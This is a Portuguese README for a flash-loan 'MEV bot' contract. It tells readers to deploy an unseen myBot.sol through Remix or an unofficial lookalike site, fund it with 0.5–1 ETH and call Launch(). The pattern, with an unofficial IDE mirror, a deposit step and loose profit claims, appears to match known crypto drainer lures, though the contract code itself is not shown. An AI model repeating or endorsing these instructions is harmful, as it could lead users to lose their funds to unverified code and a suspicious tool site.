![B](https://i.ibb.co/Cs45vCGb/20251219-1540-simple-compose-01kcvddqxpfd3bgr4kkvnf0qm7.png)


## Executor (Aave/Balancer + Uniswap/Sushi)

Basicamente, contrato para MEV: pega empréstimos flash, roda arbitragem entre DEXes, faz liquidações. Tudo já está pronto, faça deploy e use.

O que faz:

**Essencialmente:** contrato pega tokens emprestados (flash loan), troca por outros tokens através de DEX, depois devolve o empréstimo + taxa, extraindo lucro da diferença de preços.

**Importante:** todo o esquema é construído para que **todo o processo aconteça dentro de uma transação de um contrato** — desde pegar o empréstimo até o reembolso e obter lucro.

- **Aave V3 flashLoanSimple**: pega empréstimo flash e chama callback `executeOperation(...)`, onde a estratégia é executada.
- **Balancer Vault flashLoan**: empréstimo flash multi-ativo e callback `receiveFlashLoan(...)`.
- **Ciclo DEX (arbitragem)**: 2 swaps (Uniswap V3 ↔ SushiSwap V2) com verificações `minOut` e `minProfit`.
- **Liquidação (Aave V3)**: `liquidationCall(...)` com verificação `minCollateralOut`.
- **Saques**: `withdrawEth(...)`, `withdrawToken(...)` + emergência `emergencyTokenRecovery(...)`.



Como executar:

Contrato do proprietário — você é o proprietário, chama funções, ele faz empréstimos flash e estratégias em uma transação.

**Esquema rápido:**
1. Crie contrato no Remix: https://remix.ethereum.org/ or https://portable-remixide.org

Segundo Screenshot:
1- Crie arquivo .sol e cole o contrato no campo do editor [myBot.sol](myBot.sol)
2- Aba Compilação > versão 0.8.20 > botão Compile
3- Aba Deploy > Selecione contrato Executor > pressione Deploy Contract
![Instruções de criação do contrato](https://i.ibb.co/HTRkw29n/instructions.png)

2. Recarregue saldo do contrato (0.5-1 ETH)

3. Execute `Launch()` — ele pega empréstimo e faz operações

4. Se precisar sacar lucro — pressione `withdrawEth()` ou `withdrawToken()`

Início simples: `Launch()` — valor do empréstimo é calculado como saldo_contrato * 200.


- **Flash loan Aave**: `executeFlashLoanArbitrage(asset, amount, params)`
- **Flash loan Balancer**: `executeBalancerFlashLoan(tokens, amounts, userData)`

`params/userData` são codificados como:

- `operationType`:
  - `1` — Ciclo DEX
  - `2` — Liquidação

Formatos de dados:

### Ciclo DEX (operationType = 1)

```solidity
(uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)
```

- `firstDex`: `0` = UniswapV3→Sushi, `1` = Sushi→UniswapV3
- `uniFee`: 500 / 3000 / 10000
- `minOut1/minOut2`: proteção contra slippage em cada passo
- `minProfit`: lucro mínimo (caso contrário transação reverte)

### Liquidação (operationType = 2)

```solidity
(address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)
```

Importante saber:

- Não espere dinheiro fácil. Tudo depende do mercado — gas, slippage, competição, posições.

Sobre ETH:

0.5-1 ETH vai durar muito tempo — para gas, se precisar mexer com ETH/WETH, e só por precaução.

Aproximadamente sobre lucro: depende do tamanho do empréstimo e situação de mercado. Para arbitragem geralmente 0.01-0.1% do valor, para liquidações — porcentagem da posição. Com empréstimo de 100 ETH pode sair 0.01-0.1 ETH de lucro, mas é muito aproximado e sem garantias — mercado muda a cada segundo.

Boa sorte!


